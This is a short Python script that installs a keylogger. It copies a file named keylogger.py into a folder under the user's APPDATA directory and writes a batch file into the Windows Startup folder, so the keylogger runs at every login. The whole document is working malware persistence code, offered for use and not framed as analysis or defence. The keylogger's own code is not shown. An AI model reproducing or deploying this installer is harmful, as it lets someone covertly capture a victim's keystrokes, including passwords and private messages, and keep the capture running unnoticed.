
import os
import shutil
import subprocess

appdatapth = os.getenv('APPDATA')
applicationDir = os.path.join(appdatapth, 'ozuna-keylogger')
startupDirectory = os.path.join(appdatapth, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupBatfilePath = os.path.join(startupDirectory, 'logger.bat')

print('Directory')
print(startupDirectory)

if not os.path.isdir(applicationDir):
    os.makedirs(applicationDir)

destScripLocation = os.path.join(applicationDir, 'keylogger.py')
shutil.copy('keylogger.py', applicationDir)


batScriptContent = """@ECHO OFF
python \"{0}\"
EXIT /B
""".format(destScripLocation)

#if not os.path.isfile(startupBatfilePath):
f = open(startupBatfilePath, 'w')
f.write(batScriptContent)
f.close()
 